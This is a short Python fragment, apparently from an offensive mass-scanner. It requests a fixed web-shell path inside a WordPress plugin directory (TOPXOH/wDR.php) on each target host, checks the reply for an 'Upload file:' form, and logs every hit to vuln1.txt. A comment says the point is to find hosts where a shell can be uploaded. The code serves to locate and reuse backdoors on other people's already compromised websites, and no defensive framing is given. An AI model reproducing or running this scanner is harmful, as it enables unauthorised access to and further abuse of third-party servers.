...
async def style(i):  # can upload shell
    ...
    async with semaphore:
        try:
            shell = f'http://{i}/wp-content/plugins/TOPXOH/wDR.php'
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(shell, ssl=False, timeout=25) as response:
                    #shell = response.url
                    if '<span>Upload file:</span>' in await response.text():
                        vulns = vulns + 1
                        print(fg + '[+] =====>>>>>>  ' + i)
                        open('vuln1.txt', 'a').write(shell + '\n')
